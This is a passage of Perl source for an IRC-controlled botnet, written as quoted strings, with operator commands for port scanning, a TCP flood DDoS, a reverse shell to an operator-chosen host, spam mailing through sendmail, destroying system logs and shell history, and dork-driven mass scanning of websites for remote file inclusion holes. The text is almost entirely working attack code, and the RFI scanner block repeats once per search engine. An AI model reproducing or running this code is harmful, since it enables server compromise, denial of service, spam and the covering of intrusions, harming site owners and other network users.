            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "milw0rm\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "join #channel\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "part #channel\");",
            "if ($funcarg =~ /^linuxhelp/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Dir where you are : pwd\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Start a Perl file : perl file.pl\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Go back from dir : cd ..\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Force to Remove a file/dir : rm -rf file/dir;ls -la\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Show all files/dir with permissions : ls -lia\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Find config.inc.php files : find / -type f -name config.inc.php\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Find all writable folders and files : find / -perm -2 -ls\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Find all .htpasswd files : find / -type f -name .htpasswd\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2 Find all service.pwd files : find / -type f -name service.pwd\");",
            "######################",
            "#   End of  Help     #",
            "#                    #",
            "######################",
            "######################",
            "#     Commands       #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^system/) {",
            "$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Info BOT : ",
            "3 $servidor : $porta\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Uname -a     : ",
            "3 $uname\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Uptime       : ",
            "3 $uptime\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Own Prosses  : ",
            "3 $processo\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2ID           : ",
            "3 $id\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Own Dir      : ",
            "3 $ownd\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2OS           : ",
            "3 $distro\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Owner        : ",
            "3 achap\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Channel      : ",
            "3 #upsi@WebChat\");",
            "if ($funcarg =~ /^milw0rm/) {",
            "\tmy @ltt=();",
            "\tmy @bug=();",
            "\tmy $x;",
            "\tmy $page=\"\";",
            "\tmy $socke = IO::Socket::INET->new(PeerAddr=>\"milw0rm.com\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "\tprint $socke \"GET http://milw0rm.com/rss.php HTTP/1.0\\r\\nHost: milw0rm.com\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "\tmy @r = <$socke>;",
            "\t$page=\"@r\";",
            "\tclose($socke);",
            "\twhile ($page =~  m/<title>(.*)</g){",
            "\t$x = $1;",
            "\tif ($x =~ /\\&lt\\;/) {",
            "\t$x =~ s/\\&lt\\;/</g;",
            "\tif ($x !~ /milw0rm/) {",
            "\tpush (@bug,$x);",
            "\twhile ($page =~  m/<link.*expl.*([0-9]...)</g) {",
            "\tif ($1 !~ m/milw0rm.com|exploits|en/){",
            "\tpush (@ltt,\"http://www.milw0rm.com/exploits/$1 \");",
            "\t\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2milw0rm",
            "3 Latest exploits :",
            "\tforeach $x (0..(@ltt - 1)) {",
            "\t\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2milw0rm",
            "3 $bug[$x] - $ltt[$x]\");",
            "\tsleep 1;",
            "######################",
            "#      Portscan      #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^portscan (.*)/) {",
            "  my $hostip=\"$1\";",
            "  my",
            "  @portas=(\"15\",\"19\",\"98\",\"20\",\"21\",\"22\",\"23\",\"25\",\"37\",\"39\",\"42\",\"43\",\"49\",\"53\",\"63\",\"69\",\"79\",\"80\",\"101\",\"106\",\"107\",\"109\",\"110\",\"111\",\"113\",\"115\",\"117\",\"119\",\"135\",\"137\",\"139\",\"143\",\"174\",\"194\",\"389\",\"389\",\"427\",\"443\",\"444\",\"445\",\"464\",\"488\",\"512\",\"513\",\"514\",\"520\",\"540\",\"546\",\"548\",\"565\",\"609\",\"631\",\"636\",\"694\",\"749\",\"750\",\"767\",\"774\",\"783\",\"808\",\"902\",\"988\",\"993\",\"994\",\"995\",\"1005\",\"1025\",\"1033\",\"1066\",\"1079\",\"1080\",\"1109\",\"1433\",\"1434\",\"1512\",\"2049\",\"2105\",\"2432\",\"2583\",\"3128\",\"3306\",\"4321\",\"5000\",\"5222\",\"5223\",\"5269\",\"5555\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"7001\",\"7741\",\"8000\",\"8018\",\"8080\",\"8200\",\"10000\",\"19150\",\"27374\",\"31310\",\"33133\",\"33733\",\"55555\");",
            "  my (@aberta, %porta_banner);",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Scanning",
            "3 Scan Untuk Port yang Terbuka\".$1.\"",
            "3Tunggu!",
            ".\");",
            "  foreach my $porta (@portas)  {",
            "    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>",
            "    'tcp', Timeout => 4);",
            "    if ($scansock) {",
            "      push (@aberta, $porta);",
            "      $scansock->close;",
            "    }",
            "  if (@aberta) {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Scanning",
            "3 Port yang Terbuka:",
            " @aberta\");",
            "    } else {",
            "    sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Scanning",
            "3 Tiada.",
            "######################",
            "#  End of  Portscan  #",
            "#                    #",
            "######################",
            "######################",
            "#        Nmap        #",
            "#                    #",
            "######################",
            "   if ($funcarg =~ /^nmap\\s+(.*)\\s+(\\d+)\\s+(\\d+)/){",
            "         my $hostip=\"$1\";",
            "         my $portstart = \"$2\";",
            "         my $portend = \"$3\";",
            "         my (@abertas, %porta_banner);",
            "       sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Nmap",
            "2Port: $1 ",
            "3Ports $2-$3\");",
            "       foreach my $porta ($portstart..$portend){",
            "               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);",
            "    if ($scansock) {",
            "                 push (@abertas, $porta);",
            "                 $scansock->close;",
            "                 if ($xstats){",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl ::",
            "2Nmap",
            "3Dapat ",
            "3 $porta\".\"/Open\");",
            "                 }",
            "               }",
            "             }",
            "             if (@abertas) {",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl ::",
            "2Nmap",
            "3Selesai!\");",
            "             } else {",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Nmap",
            "3Tiada\");",
            "             }",
            "\t\t\t }",
            "######################",
            "#    End of Nmap     #",
            "#                    #",
            "######################",
            "######################",
            "#    Log Cleaner     #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^logcleaner/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2LogCleaned",
            "3Tunggu..\");",
            "    system 'rm -rf /var/log/lastlog';",
            "    system 'rm -rf /var/log/wtmp';",
            "\tsystem 'rm -rf /etc/wtmp';",
            "\tsystem 'rm -rf /var/run/utmp';",
            "\tsystem 'rm -rf /etc/utmp';",
            "\tsystem 'rm -rf /var/log';",
            "\tsystem 'rm -rf /var/logs';",
            "\tsystem 'rm -rf /var/adm';",
            "\tsystem 'rm -rf /var/apache/log';",
            "\tsystem 'rm -rf /var/apache/logs';",
            "\tsystem 'rm -rf /usr/local/apache/log';",
            "\tsystem 'rm -rf /usr/local/apache/logs';",
            "\tsystem 'rm -rf /root/.bash_history';",
            "\tsystem 'rm -rf /root/.ksh_history';",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2LogCleaned",
            "3 Default log and bash_history file dihapus.\");",
            "\t\tsleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2LogCleaned",
            "3 Hapuskan machine log file.\");",
            "\tsystem 'find / -name *.bash_history -exec rm -rf {} \\;';",
            "\tsystem 'find / -name *.bash_logout -exec rm -rf {} \\;';",
            "\tsystem 'find / -name \"log*\" -exec rm -rf {} \\;';",
            "\tsystem 'find / -name *.log -exec rm -rf {} \\;';",
            "\t\tsleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2LogCleaned",
            "3 Semua log telah dihapuskan.\");",
            "      }",
            "######################",
            "# End of Log Cleaner #",
            "#                    #",
            "######################",
            "# The PitBull !!!!",
            "######################",
            "#       MAILER       #",
            "#                    #",
            "######################",
            "# For mailing use :",
            "# !x @sendmail <subject> <sender> <recipient> <message>",
            "######################",
            "if ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Mailer",
            "3 Pengiriman ke :",
            "14 $3\");",
            "$subject = $1;",
            "$sender = $2;",
            "$recipient = $3;",
            "@corpo = $4;",
            "$mailtype = \"content-type: text/html\";",
            "$sendmail = '/usr/sbin/sendmail';",
            "open (SENDMAIL, \"| $sendmail -t\");",
            "print SENDMAIL \"$mailtype\\n\";",
            "print SENDMAIL \"Subject: $subject\\n\";",
            "print SENDMAIL \"From: $sender\\n\";",
            "print SENDMAIL \"To: $recipient\\n\\n\";",
            "print SENDMAIL \"@corpo\\n\\n\";",
            "close (SENDMAIL);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Mailer",
            "3 Mail Dikirim ke :",
            "14 $recipient\");",
            "######################",
            "#   End of MAILER    #",
            "#                    #",
            "######################",
            "######################",
            "#  Join And Part     #",
            "#                    #",
            "######################",
            "           if ($funcarg =~ /^join (.*)/) {",
            "              sendraw($IRC_cur_socket, \"JOIN \".$1);",
            "           }",
            "           if ($funcarg =~ /^part (.*)/) {",
            "              sendraw($IRC_cur_socket, \"PART \".$1);",
            "           }",
            "######################",
            "#End of Join And Part#",
            "#                    #",
            "######################",
            "######################",
            "#     TCPFlood       #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2DDos",
            "14 \".$1.\":\".$2.\" ",
            "3for ",
            "14 \".$3.\" ",
            "3seconds.",
            "  my $itime = time;",
            "  my ($cur_time);",
            "  $cur_time = time - $itime;",
            "  while ($3>$cur_time){",
            "  $cur_time = time - $itime;",
            "  &tcpflooder(\"$1\",\"$2\",\"$3\");",
            "sendraw($IRC_cur_socket,\"PRIVMSG $printl :",
            "2DDos",
            "3 Penembakan selesai",
            "14 \".$1.\":\".$2.\".\");",
            "######################",
            "#  End of TCPFlood   #",
            "#                    #",
            "######################",
            "######################",
            "#   Back Connect     #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {",
            "my $host = \"$1\";",
            "my $porta = \"$2\";",
            "my $proto = getprotobyname('tcp');",
            "my $iaddr = inet_aton($host);",
            "my $paddr = sockaddr_in($porta, $iaddr);",
            "my $shell = \"/bin/sh -i\";",
            "if ($^O eq \"MSWin32\") {",
            "  $shell = \"cmd.exe\";",
            "socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";",
            "connect(SOCKET, $paddr) or die \"connect: $!\";",
            "open(STDIN, \">&SOCKET\");",
            "open(STDOUT, \">&SOCKET\");",
            "open(STDERR, \">&SOCKET\");",
            "system(\"$shell\");",
            "close(STDIN);",
            "close(STDOUT);",
            "close(STDERR);",
            "if ($estatisticas)",
            "  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Backconnect",
            "3 Konek ke ",
            "14 $host:$porta\");",
            "######################",
            "#End of  Back Connect#",
            "#                    #",
            "######################",
            "######################",
            "#    MULTI SCANNER   #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "### Start Message",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4netcat",
            "7 wE lOad the bug:",
            "1 $bug ",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4netcat",
            "7 wE lOad the dOrk:",
            "1 $dork ",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4netcat",
            "14 let",
            "s rock this party",
            "### End of Start Message",
            "# Starting Google",
            "\tmy @glist=&google($dork);",
            "push(my @tot, @glist );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4g00gle",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4g00gle",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4g00gle",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @mlist=&msn($dork);",
            "push(my @tot, @mlist );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4mSn",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4mSn",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4mSn",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @allist=&alltheweb($dork);",
            "push(my @tot, @allist );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aLLthewEb",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aLLthewEb",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aLLthewEb",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @asklist=&ask($dork);",
            "push(my @tot, @asklist );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aSk",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aSk",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aSk",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @uollist=&uol($dork);",
            "push(my @tot, @uollist );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4uoL",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4uoL",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4uoL",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @alist=&altavista($dork);",
            "push(my @tot, @alist );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aLtaviSta",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aLtaviSta",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4aLtaviSta",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @naver=&naver($dork);",
            "push(my @tot, @naver );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4nAvEr",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4nAvEr",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4nAvEr",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "12$print \");",
            "exit;",
            "if ($funcarg =~ /^rfi\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "my %hosts;",
            "\tmy @baidu=&baidu($dork);",
            "push(my @tot, @baidu );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4bAidu",
            "\".scalar(@tot).\" ",
            "3sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4bAidu",
            "7 wE have cLeaNed ",
            "\".scalar(@puliti).\" ",
            "3sites\");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %50==0){",
            "#sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "3Exploiting",
            "1 \".$contatore.\" ",
            "1 \".$uni. \" ",
            "3Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4bAidu",
            "7 sCaN fiNniShed for $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(7);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Osirys/ && $re =~ /id:/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
            "4$print \");",
            "elsif($re =~ /Osirys/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Safe Mode = ",
            "14): ",
